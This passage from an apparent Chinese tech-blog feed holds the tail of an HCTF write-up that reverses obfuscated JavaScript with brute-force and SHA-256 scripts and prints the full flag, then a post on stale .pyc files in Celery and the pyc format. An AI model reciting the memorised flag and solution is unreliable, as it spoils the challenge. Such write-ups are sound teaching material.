class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在两个未知变量，输入第一部分长度和输入第五部分前四位，不多说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var toHex = function (stri) &#123;</span><br><span class="line">    var str = &apos;0x&apos;;</span><br><span class="line">    for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">        str += stri.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">a = &apos;=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">      for (var j = a.length - 1; j &gt;= 0; j--) &#123;</span><br><span class="line">            for (var k = a.length - 1; k &gt;= 0; k--) &#123;</span><br><span class="line">                  for (var q = a.length - 1; q &gt;= 0; q--) &#123;</span><br><span class="line">                        for (var n = 10 - 1; n &gt;= 0; n--) &#123;</span><br><span class="line">                              if (toHex(a[i]+a[j]+a[k]+a[q]) - 1218466658 == (70341426 * 1266420339 * n) % 798707826) &#123;</span><br><span class="line">                                    console.log(a[i]+a[j]+a[k]+a[q]);</span><br><span class="line">                                    console.log(n);</span><br><span class="line">                              &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">                  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到输入第五部分前四位h4rd和输入第一部分长度7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o = toHex(shuru_3[4].substr(6, 2)).substr(2) == shuru_3[4].substr(6, 1).charCodeAt() * shuru_3[4].length * 5;</span><br><span class="line">return o &amp;&amp; shuru_3[4].substr(4, 1) == 2 &amp;&amp; shuru_3[4].substr(6, 2) == repeat(shuru_3[4].substr(7, 1), 2);</span><br></pre></td></tr></table></figure><p>得到第五部分第5位为2；return需要为1 ==&gt; o为1，两个变量，跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var toHex = function (stri) &#123;</span><br><span class="line">    var str = &apos;0x&apos;;</span><br><span class="line">    for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">        str += stri.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">a = &apos;=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;&apos;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">            for (var n = 20 - 1; n &gt;= 0; n--) &#123;</span><br><span class="line">                  if(toHex(a[i]+a[i]).substr(2) == a[i].charCodeAt() * n * 5)&#123;</span><br><span class="line">                        console.log(a[i]+a[i]);</span><br><span class="line">                        console.log(n);</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到第五部分长度13和第五部分7、8位为ee</p><p>至此，flag雏形为hctf{<strong>_rev3rse_iz_s0_h4rd2<em>ee*</em></strong>}，*为未知</p><p>本地条件差不多用光了，用官方提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag.substr(-5,3)==&quot;333&quot;</span><br><span class="line">flag.substr(-8,1)==&quot;333&quot;</span><br><span class="line">        if (!m || repeat(shuru_3[4].substr(5, 1), 2) == shuru_3[4].substr(-5, 4) || (shuru_3[4].substr(-2, 1) - shuru_3[4].substr(4, 1)) != 1) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>得到hctf{**_rev3rse_iz_s0_h4rd23ee3333}</p><p>还差两位，根据提示用sha256爆破，首先，由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var res = (toHex(shuru_3[0].substr(-2, 2)) ^ toHex(shuru_3[0].substr(4, 1))) % shuru_3[0].length == 5;</span><br><span class="line">if (!res) &#123;</span><br><span class="line">    return ![];</span><br><span class="line">&#125;</span><br><span class="line">前面拿到shuru_3[0].length == 7</span><br></pre></td></tr></table></figure><p>根据条件跑出最后两位的所有可能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var toHex = function (stri) &#123;</span><br><span class="line">    var str = &apos;0x&apos;;</span><br><span class="line">    for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">        str += stri.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">a = &apos;=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;&apos;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">      for (var j = a.length - 1; j &gt;= 0; j--) &#123;</span><br><span class="line">                  if((toHex(a[i]+a[j]) ^ toHex(&apos;&#123;&apos;)) % 7 == 5)&#123;</span><br><span class="line">                        console.log(a[i]+a[j]);</span><br><span class="line">                  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对所有可能的sha256与预期验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&apos;http://www.bichlmeier.info/sha256.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">//console.log(sha256_digest(&quot;message digest&quot;));</span><br><span class="line">a=[&apos;&#125;y&apos;,&apos;&#125;r&apos;,&apos;&#125;l&apos;,&apos;&#125;k&apos;,&apos;&#125;e&apos;,&apos;&#125;4&apos;,&apos;&#125;3&apos;,&apos;&#125;W&apos;,&apos;&#125;H&apos;,&apos;&#125;A&apos;,&apos;&#123;x&apos;,&apos;&#123;q&apos;,&apos;&#123;j&apos;,&apos;&#123;d&apos;,&apos;&#123;c&apos;,&apos;&#123;9&apos;,&apos;&#123;2&apos;,&apos;&#123;V&apos;,&apos;&#123;O&apos;,&apos;z&#123;&apos;,&apos;zu&apos;,&apos;zn&apos;,&apos;zg&apos;,&apos;z6&apos;,&apos;zX&apos;,&apos;zQ&apos;,&apos;zJ&apos;,&apos;zD&apos;,&apos;zC&apos;,&apos;z=&apos;,&apos;yp&apos;,&apos;yi&apos;,&apos;yb&apos;,&apos;y8&apos;,&apos;y1&apos;,&apos;yU&apos;,&apos;yN&apos;,&apos;yG&apos;,&apos;xz&apos;,&apos;xt&apos;,&apos;xs&apos;,&apos;xm&apos;,&apos;xf&apos;,&apos;x5&apos;,&apos;xP&apos;,&apos;xI&apos;,&apos;xB&apos;,&apos;ww&apos;,&apos;wh&apos;,&apos;wa&apos;,&apos;w0&apos;,&apos;wZ&apos;,&apos;wT&apos;,&apos;wS&apos;,&apos;wM&apos;,&apos;wF&apos;,&apos;vy&apos;,&apos;vr&apos;,&apos;vl&apos;,&apos;vk&apos;,&apos;ve&apos;,&apos;v4&apos;,&apos;v3&apos;,&apos;vW&apos;,&apos;vH&apos;,&apos;vA&apos;,&apos;u&#125;&apos;,&apos;uv&apos;,&apos;uo&apos;,&apos;u7&apos;,&apos;uY&apos;,&apos;uR&apos;,&apos;uL&apos;,&apos;uK&apos;,&apos;uE&apos;,&apos;tx&apos;,&apos;tq&apos;,&apos;tj&apos;,&apos;td&apos;,&apos;tc&apos;,&apos;t9&apos;,&apos;t2&apos;,&apos;tV&apos;,&apos;tO&apos;,&apos;s&#123;&apos;,&apos;su&apos;,&apos;sn&apos;,&apos;sg&apos;,&apos;s6&apos;,&apos;sX&apos;,&apos;sQ&apos;,&apos;sJ&apos;,&apos;sD&apos;,&apos;sC&apos;,&apos;s=&apos;,&apos;rp&apos;,&apos;ri&apos;,&apos;rb&apos;,&apos;r8&apos;,&apos;r1&apos;,&apos;rU&apos;,&apos;rN&apos;,&apos;rG&apos;,&apos;qz&apos;,&apos;qt&apos;,&apos;qs&apos;,&apos;qm&apos;,&apos;qf&apos;,&apos;q5&apos;,&apos;qP&apos;,&apos;qI&apos;,&apos;qB&apos;,&apos;pw&apos;,&apos;ph&apos;,&apos;pa&apos;,&apos;p0&apos;,&apos;pZ&apos;,&apos;pT&apos;,&apos;pS&apos;,&apos;pM&apos;,&apos;pF&apos;,&apos;oy&apos;,&apos;or&apos;,&apos;ol&apos;,&apos;ok&apos;,&apos;oe&apos;,&apos;o4&apos;,&apos;o3&apos;,&apos;oW&apos;,&apos;oH&apos;,&apos;oA&apos;,&apos;n&#125;&apos;,&apos;nv&apos;,&apos;no&apos;,&apos;n7&apos;,&apos;nY&apos;,&apos;nR&apos;,&apos;nL&apos;,&apos;nK&apos;,&apos;nE&apos;,&apos;mx&apos;,&apos;mq&apos;,&apos;mj&apos;,&apos;md&apos;,&apos;mc&apos;,&apos;m9&apos;,&apos;m2&apos;,&apos;mV&apos;,&apos;mO&apos;,&apos;l&#123;&apos;,&apos;lu&apos;,&apos;ln&apos;,&apos;lg&apos;,&apos;l6&apos;,&apos;lX&apos;,&apos;lQ&apos;,&apos;lJ&apos;,&apos;lD&apos;,&apos;lC&apos;,&apos;l=&apos;,&apos;kp&apos;,&apos;ki&apos;,&apos;kb&apos;,&apos;k8&apos;,&apos;k1&apos;,&apos;kU&apos;,&apos;kN&apos;,&apos;kG&apos;,&apos;jz&apos;,&apos;jt&apos;,&apos;js&apos;,&apos;jm&apos;,&apos;jf&apos;,&apos;j5&apos;,&apos;jP&apos;,&apos;jI&apos;,&apos;jB&apos;,&apos;iw&apos;,&apos;ih&apos;,&apos;ia&apos;,&apos;i0&apos;,&apos;iZ&apos;,&apos;iT&apos;,&apos;iS&apos;,&apos;iM&apos;,&apos;iF&apos;,&apos;hy&apos;,&apos;hr&apos;,&apos;hl&apos;,&apos;hk&apos;,&apos;he&apos;,&apos;h4&apos;,&apos;h3&apos;,&apos;hW&apos;,&apos;hH&apos;,&apos;hA&apos;,&apos;g&#125;&apos;,&apos;gv&apos;,&apos;go&apos;,&apos;g7&apos;,&apos;gY&apos;,&apos;gR&apos;,&apos;gL&apos;,&apos;gK&apos;,&apos;gE&apos;,&apos;fx&apos;,&apos;fq&apos;,&apos;fj&apos;,&apos;fd&apos;,&apos;fc&apos;,&apos;f9&apos;,&apos;f2&apos;,&apos;fV&apos;,&apos;fO&apos;,&apos;e&#123;&apos;,&apos;eu&apos;,&apos;en&apos;,&apos;eg&apos;,&apos;e6&apos;,&apos;eX&apos;,&apos;eQ&apos;,&apos;eJ&apos;,&apos;eD&apos;,&apos;eC&apos;,&apos;e=&apos;,&apos;dp&apos;,&apos;di&apos;,&apos;db&apos;,&apos;d8&apos;,&apos;d1&apos;,&apos;dU&apos;,&apos;dN&apos;,&apos;dG&apos;,&apos;cz&apos;,&apos;ct&apos;,&apos;cs&apos;,&apos;cm&apos;,&apos;cf&apos;,&apos;c5&apos;,&apos;cP&apos;,&apos;cI&apos;,&apos;cB&apos;,&apos;bw&apos;,&apos;bh&apos;,&apos;ba&apos;,&apos;b0&apos;,&apos;bZ&apos;,&apos;bT&apos;,&apos;bS&apos;,&apos;bM&apos;,&apos;bF&apos;,&apos;ay&apos;,&apos;ar&apos;,&apos;al&apos;,&apos;ak&apos;,&apos;ae&apos;,&apos;a4&apos;,&apos;a3&apos;,&apos;aW&apos;,&apos;aH&apos;,&apos;aA&apos;,&apos;0y&apos;,&apos;0r&apos;,&apos;0l&apos;,&apos;0k&apos;,&apos;0e&apos;,&apos;04&apos;,&apos;03&apos;,&apos;0W&apos;,&apos;0H&apos;,&apos;0A&apos;,&apos;9z&apos;,&apos;9t&apos;,&apos;9s&apos;,&apos;9m&apos;,&apos;9f&apos;,&apos;95&apos;,&apos;9P&apos;,&apos;9I&apos;,&apos;9B&apos;,&apos;8w&apos;,&apos;8h&apos;,&apos;8a&apos;,&apos;80&apos;,&apos;8Z&apos;,&apos;8T&apos;,&apos;8S&apos;,&apos;8M&apos;,&apos;8F&apos;,&apos;7y&apos;,&apos;7r&apos;,&apos;7l&apos;,&apos;7k&apos;,&apos;7e&apos;,&apos;74&apos;,&apos;73&apos;,&apos;7W&apos;,&apos;7H&apos;,&apos;7A&apos;,&apos;6&#125;&apos;,&apos;6v&apos;,&apos;6o&apos;,&apos;67&apos;,&apos;6Y&apos;,&apos;6R&apos;,&apos;6L&apos;,&apos;6K&apos;,&apos;6E&apos;,&apos;5x&apos;,&apos;5q&apos;,&apos;5j&apos;,&apos;5d&apos;,&apos;5c&apos;,&apos;59&apos;,&apos;52&apos;,&apos;5V&apos;,&apos;5O&apos;,&apos;4&#123;&apos;,&apos;4u&apos;,&apos;4n&apos;,&apos;4g&apos;,&apos;46&apos;,&apos;4X&apos;,&apos;4Q&apos;,&apos;4J&apos;,&apos;4D&apos;,&apos;4C&apos;,&apos;4=&apos;,&apos;3p&apos;,&apos;3i&apos;,&apos;3b&apos;,&apos;38&apos;,&apos;31&apos;,&apos;3U&apos;,&apos;3N&apos;,&apos;3G&apos;,&apos;2z&apos;,&apos;2t&apos;,&apos;2s&apos;,&apos;2m&apos;,&apos;2f&apos;,&apos;25&apos;,&apos;2P&apos;,&apos;2I&apos;,&apos;2B&apos;,&apos;1w&apos;,&apos;1h&apos;,&apos;1a&apos;,&apos;10&apos;,&apos;1Z&apos;,&apos;1T&apos;,&apos;1S&apos;,&apos;1M&apos;,&apos;1F&apos;,&apos;Zy&apos;,&apos;Zr&apos;,&apos;Zl&apos;,&apos;Zk&apos;,&apos;Ze&apos;,&apos;Z4&apos;,&apos;Z3&apos;,&apos;ZW&apos;,&apos;ZH&apos;,&apos;ZA&apos;,&apos;Y&#125;&apos;,&apos;Yv&apos;,&apos;Yo&apos;,&apos;Y7&apos;,&apos;YY&apos;,&apos;YR&apos;,&apos;YL&apos;,&apos;YK&apos;,&apos;YE&apos;,&apos;Xx&apos;,&apos;Xq&apos;,&apos;Xj&apos;,&apos;Xd&apos;,&apos;Xc&apos;,&apos;X9&apos;,&apos;X2&apos;,&apos;XV&apos;,&apos;XO&apos;,&apos;W&#123;&apos;,&apos;Wu&apos;,&apos;Wn&apos;,&apos;Wg&apos;,&apos;W6&apos;,&apos;WX&apos;,&apos;WQ&apos;,&apos;WJ&apos;,&apos;WD&apos;,&apos;WC&apos;,&apos;W=&apos;,&apos;Vp&apos;,&apos;Vi&apos;,&apos;Vb&apos;,&apos;V8&apos;,&apos;V1&apos;,&apos;VU&apos;,&apos;VN&apos;,&apos;VG&apos;,&apos;Uz&apos;,&apos;Ut&apos;,&apos;Us&apos;,&apos;Um&apos;,&apos;Uf&apos;,&apos;U5&apos;,&apos;UP&apos;,&apos;UI&apos;,&apos;UB&apos;,&apos;Tw&apos;,&apos;Th&apos;,&apos;Ta&apos;,&apos;T0&apos;,&apos;TZ&apos;,&apos;TT&apos;,&apos;TS&apos;,&apos;TM&apos;,&apos;TF&apos;,&apos;Sy&apos;,&apos;Sr&apos;,&apos;Sl&apos;,&apos;Sk&apos;,&apos;Se&apos;,&apos;S4&apos;,&apos;S3&apos;,&apos;SW&apos;,&apos;SH&apos;,&apos;SA&apos;,&apos;R&#125;&apos;,&apos;Rv&apos;,&apos;Ro&apos;,&apos;R7&apos;,&apos;RY&apos;,&apos;RR&apos;,&apos;RL&apos;,&apos;RK&apos;,&apos;RE&apos;,&apos;Qx&apos;,&apos;Qq&apos;,&apos;Qj&apos;,&apos;Qd&apos;,&apos;Qc&apos;,&apos;Q9&apos;,&apos;Q2&apos;,&apos;QV&apos;,&apos;QO&apos;,&apos;P&#123;&apos;,&apos;Pu&apos;,&apos;Pn&apos;,&apos;Pg&apos;,&apos;P6&apos;,&apos;PX&apos;,&apos;PQ&apos;,&apos;PJ&apos;,&apos;PD&apos;,&apos;PC&apos;,&apos;P=&apos;,&apos;Op&apos;,&apos;Oi&apos;,&apos;Ob&apos;,&apos;O8&apos;,&apos;O1&apos;,&apos;OU&apos;,&apos;ON&apos;,&apos;OG&apos;,&apos;Nz&apos;,&apos;Nt&apos;,&apos;Ns&apos;,&apos;Nm&apos;,&apos;Nf&apos;,&apos;N5&apos;,&apos;NP&apos;,&apos;NI&apos;,&apos;NB&apos;,&apos;Mw&apos;,&apos;Mh&apos;,&apos;Ma&apos;,&apos;M0&apos;,&apos;MZ&apos;,&apos;MT&apos;,&apos;MS&apos;,&apos;MM&apos;,&apos;MF&apos;,&apos;Ly&apos;,&apos;Lr&apos;,&apos;Ll&apos;,&apos;Lk&apos;,&apos;Le&apos;,&apos;L4&apos;,&apos;L3&apos;,&apos;LW&apos;,&apos;LH&apos;,&apos;LA&apos;,&apos;K&#125;&apos;,&apos;Kv&apos;,&apos;Ko&apos;,&apos;K7&apos;,&apos;KY&apos;,&apos;KR&apos;,&apos;KL&apos;,&apos;KK&apos;,&apos;KE&apos;,&apos;Jx&apos;,&apos;Jq&apos;,&apos;Jj&apos;,&apos;Jd&apos;,&apos;Jc&apos;,&apos;J9&apos;,&apos;J2&apos;,&apos;JV&apos;,&apos;JO&apos;,&apos;I&#123;&apos;,&apos;Iu&apos;,&apos;In&apos;,&apos;Ig&apos;,&apos;I6&apos;,&apos;IX&apos;,&apos;IQ&apos;,&apos;IJ&apos;,&apos;ID&apos;,&apos;IC&apos;,&apos;I=&apos;,&apos;Hp&apos;,&apos;Hi&apos;,&apos;Hb&apos;,&apos;H8&apos;,&apos;H1&apos;,&apos;HU&apos;,&apos;HN&apos;,&apos;HG&apos;,&apos;Gz&apos;,&apos;Gt&apos;,&apos;Gs&apos;,&apos;Gm&apos;,&apos;Gf&apos;,&apos;G5&apos;,&apos;GP&apos;,&apos;GI&apos;,&apos;GB&apos;,&apos;Fw&apos;,&apos;Fh&apos;,&apos;Fa&apos;,&apos;F0&apos;,&apos;FZ&apos;,&apos;FT&apos;,&apos;FS&apos;,&apos;FM&apos;,&apos;FF&apos;,&apos;Ey&apos;,&apos;Er&apos;,&apos;El&apos;,&apos;Ek&apos;,&apos;Ee&apos;,&apos;E4&apos;,&apos;E3&apos;,&apos;EW&apos;,&apos;EH&apos;,&apos;EA&apos;,&apos;D&#125;&apos;,&apos;Dv&apos;,&apos;Do&apos;,&apos;D7&apos;,&apos;DY&apos;,&apos;DR&apos;,&apos;DL&apos;,&apos;DK&apos;,&apos;DE&apos;,&apos;Cx&apos;,&apos;Cq&apos;,&apos;Cj&apos;,&apos;Cd&apos;,&apos;Cc&apos;,&apos;C9&apos;,&apos;C2&apos;,&apos;CV&apos;,&apos;CO&apos;,&apos;B&#123;&apos;,&apos;Bu&apos;,&apos;Bn&apos;,&apos;Bg&apos;,&apos;B6&apos;,&apos;BX&apos;,&apos;BQ&apos;,&apos;BJ&apos;,&apos;BD&apos;,&apos;BC&apos;,&apos;B=&apos;,&apos;Ap&apos;,&apos;Ai&apos;,&apos;Ab&apos;,&apos;A8&apos;,&apos;A1&apos;,&apos;AU&apos;,&apos;AN&apos;,&apos;AG&apos;,&apos;=&#125;&apos;,&apos;=v&apos;,&apos;=o&apos;,&apos;=7&apos;,&apos;=Y&apos;,&apos;=R&apos;,&apos;=L&apos;,&apos;=K&apos;,&apos;=E&apos;];</span><br><span class="line">first = &apos;hctf&#123;&apos;;</span><br><span class="line">last = &apos;_rev3rse_iz_s0_h4rd23ee3333&#125;&apos;;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">if((sha256_digest(first+a[i]+last))==&quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;)&#123;</span><br><span class="line">console.log(first+a[i]+last);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>拿到flag ==&gt; hctf{j5_rev3rse_iz_s0_h4rd23ee3333}</p><p>参考链接：<br><a href="http://www.freebuf.com/articles/web/97945.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/97945.html</a><br>          <a href="https://github.com/javascript-obfuscator/javascript-obfuscator" target="_blank" rel="noopener">https://github.com/javascript-obfuscator/javascript-obfuscator</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JS混淆分析&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="混淆" scheme="https://michaelwayneliu.github.io/tags/%E6%B7%B7%E6%B7%86/"/>
    
      <category term="JS" scheme="https://michaelwayneliu.github.io/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>强大的pyc</title>
    <link href="https://michaelwayneliu.github.io/2018/01/13/%E5%BC%BA%E5%A4%A7%E7%9A%84pyc/"/>
    <id>https://michaelwayneliu.github.io/2018/01/13/强大的pyc/</id>
    <published>2018-01-13T02:35:25.000Z</published>
    <updated>2018-01-13T02:43:09.349Z</updated>
    
    <content type="html"><![CDATA[<p>修改了程序源码，使用celery调用task调了半天，结果发现程序竟然一直没有生效。尝试过使源程序报错，从日志里找到信息，但是程序依然运行良好。<br><a id="more"></a></p><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>修改了程序源码，使用celery调用task调了半天，结果发现程序竟然一直没有生效。尝试过使源程序报错，从日志里找到信息，但是程序依然运行良好。</p><p>搜了关于celery rabbitmq yara的相关问题，没有找到结果，最后无意中找到了问题的所在，自己还是太嫩。。</p><h3 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h3><p>pyc文件是用来保存python虚拟机编译生成的byte code 的。在python的运行过程中，如果遇到import首先在设定好的path中寻找对应的.pyc或者.dll 文件。如果没有这些文件，则编译成对应的PycodeObject并向.pyc文件写入中间结果。也就是在你 import 别的 py 文件时，那个 py 文件会被存一份 pyc 加速下次装载。具体原理大神说的很清楚<a href="https://www.zhihu.com/question/30296617" target="_blank" rel="noopener">https://www.zhihu.com/question/30296617</a></p><h3 id="celery"><a href="#celery" class="headerlink" title="celery"></a>celery</h3><p>命令行执行celery worker -A –loglevel=info时，必须可导入，所以可以为PY模块或包，但需要注意的不管是包还是模块都必须正确指定Celery入口文件(如果为包则默认的入口文件名为celery.py)的绝对导入名称(app/work.app)，Celery通过动态导入获取实例化后的应用，通过实例化时指定的配置以及include来依次导入任务执行文件中的任务指定单元，然后就是等待任务，可以看出Celery是通过相对/绝对导入来查找定义的任务执行单元，<strong>PY导入成功后会生成PYC文件，所以代码修改后一定要先删除PYC文件</strong>。</p><h3 id="排除pyc干扰"><a href="#排除pyc干扰" class="headerlink" title="排除pyc干扰"></a>排除pyc干扰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /project -name &quot;*.pyc&quot; | xargs rm -rf</span><br></pre></td></tr></table></figure><p>在打包时忽略 .pyc 文件或许是个更方便的办法。<br>tar和zip都可以加上 –exclude=*.pyc 参数来排除 pyc 文件</p><h3 id="pyc逆向"><a href="#pyc逆向" class="headerlink" title="pyc逆向"></a>pyc逆向</h3><p>既然遇到了pyc问题，就顺便学学pyc的逆向吧~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[demo.py]</span><br><span class="line">class A:</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def Fun():</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">value = 1</span><br><span class="line">str = “Python”</span><br><span class="line">a = A()</span><br><span class="line">Fun()</span><br></pre></td></tr></table></figure><p>Python在执行demo.py文件时，首先进行编译，编译的结果有字节码(py文件中操作的处理结果)和Python源代码中包含的静态的信息，如字符串常量等。编译的结果存储在Python运行期的一个对象（<a href="http://svn.python.org/projects/python/branches/release26-maint/Include/code.h" target="_blank" rel="noopener">PyCodeObject对象</a>）中，当Python运行结束后，这些信息甚至还会被存储在一种文件（Pyc文件，通过<a href="http://svn.python.org/projects/python/branches/release26-maint/Python/marshal.c" target="_blank" rel="noopener">marshal</a>序列化）中。</p><p>所以PyCodeObject就是Python源代码编译之后的关于程序的静态信息的集合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PyCodeObject长这样</span><br><span class="line">[compile.h]</span><br><span class="line">/* Bytecode object */</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    int co_argcount;        /* #arguments, except *args */</span><br><span class="line">    int co_nlocals;     /* #local variables */</span><br><span class="line">    int co_stacksize;       /* #entries needed for evaluation stack */</span><br><span class="line">    int co_flags;       /* CO_..., see below */</span><br><span class="line">    PyObject *co_code;      /* instruction opcodes */</span><br><span class="line">    PyObject *co_consts;    /* list (constants used) */</span><br><span class="line">    PyObject *co_names;     /* list of strings (names used) */</span><br><span class="line">    PyObject *co_varnames;  /* tuple of strings (local variable names) */</span><br><span class="line">    PyObject *co_freevars;  /* tuple of strings (free variable names) */</span><br><span class="line">    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */</span><br><span class="line">    /* The rest doesn&apos;t count for hash/cmp */</span><br><span class="line">    PyObject *co_filename;  /* string (where it was loaded from) */</span><br><span class="line">    PyObject *co_name;      /* string (name, for reference) */</span><br><span class="line">    int co_firstlineno;     /* first source line number */</span><br><span class="line">    PyObject *co_lnotab;    /* string (encoding addr&lt;-&gt;lineno mapping) */</span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure><p>对应一个作用域，会创建一个PyCodeObject与这段Code Block对应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[CodeObject.py]</span><br><span class="line">class A:</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def Fun():</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">Fun()</span><br></pre></td></tr></table></figure></p><p>在Python编译完成后，一共会创建3个PyCodeObject对象，一个是对应CodeObject.py的，一个是对应class A这段Code（作用域），而最后一个是对应def Fun这段Code的。可以通过Pyc文件保存PyCodeObject</p><p>其中co_lnotab记录byte code和source code的对应信息，记录这些信息间的增量值，所以，对应的co_lnotab就应该是：0，1， 6，1， 44，5</p><table><thead><tr><th>Byte code在co_code中的偏移</th><th>.py文件中源代码的行数</th></tr></thead><tbody><tr><td>0</td><td>1</td></tr><tr><td>6</td><td>2</td></tr><tr><td>50</td><td>7</td></tr></tbody></table><p>一个pyc文件的构成就像下面的结构一样，一板一眼，按顺序往下代就是，遇到不理解的常量什么的就去查<a href="https://github.com/Python/cpython/blob/2.7/Include/opcode.h" target="_blank" 